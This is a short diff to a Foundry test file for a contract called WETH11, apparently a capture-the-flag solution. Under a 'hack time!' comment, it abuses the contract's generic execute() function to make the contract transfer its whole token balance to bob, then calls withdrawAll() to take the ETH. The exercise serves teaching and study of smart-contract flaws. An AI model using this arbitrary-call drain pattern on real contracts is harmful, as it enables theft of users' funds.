@@ -35,13 +35,14 @@ contract Weth11Test is Test {
         // hack time!
         weth.execute(
             address(weth),
+            0,
             abi.encodeWithSignature(
                 "transfer(address,uint256)",
-                address(this),
+                bob,
                 address(weth).balance
-            ),
-            0
+            )
         );
+        weth.withdrawAll();
 
         vm.stopPrank();
 
